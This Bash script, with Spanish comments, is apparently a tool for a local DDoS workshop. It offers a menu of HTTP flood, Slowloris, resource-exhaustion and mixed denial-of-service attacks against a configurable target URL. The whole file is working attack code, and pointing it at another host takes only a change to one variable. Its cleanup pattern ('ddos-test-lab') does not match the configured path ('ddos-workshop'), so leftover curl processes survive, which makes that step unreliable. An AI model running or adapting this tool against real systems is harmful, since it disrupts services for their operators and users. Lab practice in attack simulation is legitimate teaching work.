#!/bin/bash

# DDoS Simulation Script - Pruebas educativas
# Simula múltiples tipos de ataques DDoS

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuración
BASE_URL="http://192.168.0.100:8080/ddos-workshop"
ENDPOINTS=(
    "/heavy-operation.jsp"
    "/api/data.jsp"
    "/api/process.jsp"
    "/load-test.jsp"
)

show_header() {
    echo -e "${BLUE}"
    cat << "EOF"
    ____  ____  ____  __________________ 
   / __ \/ __ \/ __ \/ ___/ ___/ ___/ _ \
  / / / / / / / / / /\__ \\__ \\\__ \ (_) |
 / /_/ / /_/ / /_/ /___/ /__/ /__/ \__, |
/_____/\____/_____//____/____/____/____/ 
                                         
        DDoS Simulation Tool
      Solo para pruebas locales
EOF
    echo -e "${NC}"
}

show_menu() {
    echo -e "\n${YELLOW}🎯 Selecciona el tipo de ataque:${NC}"
    echo "1) HTTP Flood Attack"
    echo "2) Slowloris Attack"
    echo "3) Resource Exhaustion"
    echo "4) Mixed Attack"
    echo "5) Monitoring Only"
    echo "6) Exit"
    echo -n "Selección [1-6]: "
}

http_flood_attack() {
    echo -e "\n${GREEN}🚀 Iniciando HTTP Flood Attack${NC}"
    
    read -p "Número de requests [1000]: " requests
    requests=${requests:-1000}
    
    read -p "Concurrencia [50]: " concurrency
    concurrency=${concurrency:-50}
    
    read -p "Duración (segundos) [30]: " duration
    duration=${duration:-30}
    
    echo -e "${YELLOW}🎯 Target: $BASE_URL${NC}"
    echo "Requests: $requests"
    echo "Concurrency: $concurrency"
    echo "Duration: ${duration}s"
    echo
    
    # Ejecutar múltiples endpoints simultáneamente
    for endpoint in "${ENDPOINTS[@]}"; do
        echo -e "${BLUE}Atacando: $endpoint${NC}"
        timeout ${duration}s ./scripts/http-flood.sh "$BASE_URL$endpoint" $((requests/4)) $((concurrency/4)) &
    done
    
    echo -e "${YELLOW}⚡ Ataque en progreso... Espera $duration segundos${NC}"
    sleep $duration
    echo -e "${GREEN}✅ HTTP Flood completado${NC}"
}

slowloris_attack() {
    echo -e "\n${GREEN}🐌 Iniciando Slowloris Attack${NC}"
    
    # Verificar si Python está disponible
    if command -v python3 &> /dev/null; then
        echo -e "${BLUE}Usando Python Slowloris${NC}"
        python3 ./scripts/slowloris.py "$BASE_URL" &
        local slowloris_pid=$!
        
        read -p "Duración del ataque (segundos) [60]: " duration
        duration=${duration:-60}
        
        echo -e "${YELLOW}Slowloris ejecutándose (PID: $slowloris_pid) por ${duration}s${NC}"
        sleep $duration
        kill $slowloris_pid
        echo -e "${GREEN}✅ Slowloris attack detenido${NC}"
    else
        echo -e "${RED}Python3 no disponible. Instálalo para usar Slowloris.${NC}"
    fi
}

resource_attack() {
    echo -e "\n${GREEN}💾 Iniciando Resource Exhaustion Attack${NC}"
    
    read -p "Número de procesos [10]: " processes
    processes=${processes:-10}
    
    # Crear procesos que consumen recursos
    for ((i=1; i<=processes; i++)); do
        echo -e "${BLUE}Iniciando proceso consumidor $i${NC}"
        
        # Endpoint que consume mucha memoria
        curl -s "$BASE_URL/api/data.jsp?size=50&count=10" > /dev/null &
        
        # Endpoint que consume CPU
        curl -s "$BASE_URL/heavy-operation.jsp?iterations=5000000" > /dev/null &
    done
    
    read -p "Duración del ataque (segundos) [45]: " duration
    duration=${duration:-45}
    
    echo -e "${YELLOW}🎯 Resource attack ejecutándose por ${duration}s${NC}"
    sleep $duration
    
    # Limpiar procesos
    pkill -f "curl.*ddos-test-lab" 2>/dev/null
    echo -e "${GREEN}✅ Resource attack detenido${NC}"
}

mixed_attack() {
    echo -e "\n${GREEN}🌪️ Iniciando Mixed DDoS Attack${NC}"
    
    echo -e "${YELLOW}Ejecutando múltiples vectores simultáneamente...${NC}"
    
    # HTTP Flood
    ./scripts/http-flood.sh "$BASE_URL/heavy-operation.jsp" 2000 100 &
    local flood_pid=$!
    
    # Resource attack
    for ((i=1; i<=5; i++)); do
        curl -s "$BASE_URL/api/data.jsp?size=100&count=5" > /dev/null &
    done
    
    # Slow requests
    if command -v python3 &> /dev/null; then
        python3 ./scripts/slowloris.py "$BASE_URL" 10 &
        local slowloris_pid=$!
    fi
    
    read -p "Duración del ataque (segundos) [60]: " duration
    duration=${duration:-60}
    
    echo -e "${YELLOW}Mixed attack en progreso... Espera $duration segundos${NC}"
    sleep $duration
    
    # Cleanup
    kill $flood_pid 2>/dev/null
    pkill -f "curl.*ddos-test-lab" 2>/dev/null
    if [ ! -z "$slowloris_pid" ]; then
        kill $slowloris_pid 2>/dev/null
    fi
    
    echo -e "${GREEN}✅ Mixed attack completado${NC}"
}

monitor_only() {
    echo -e "\n${GREEN}📊 Iniciando solo monitoreo${NC}"
    ./scripts/resource-monitor.sh
}

main() {
    show_header
    
    while true; do
        show_menu
        read choice
        
        case $choice in
            1) http_flood_attack ;;
            2) slowloris_attack ;;
            3) resource_attack ;;
            4) mixed_attack ;;
            5) monitor_only ;;
            6) 
                echo -e "${GREEN}👋 Saliendo...${NC}"
                # Limpiar procesos pendientes
                pkill -f "curl.*ddos-test-lab" 2>/dev/null
                exit 0
                ;;
            *) echo -e "${RED}❌ Opción inválida${NC}" ;;
        esac
        
        echo
        read -p "¿Ejecutar otro ataque? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}👋 Finalizando simulación${NC}"
            # Cleanup
            pkill -f "curl.*ddos-test-lab" 2>/dev/null
            break
        fi
    done
}

# Ejecutar main
main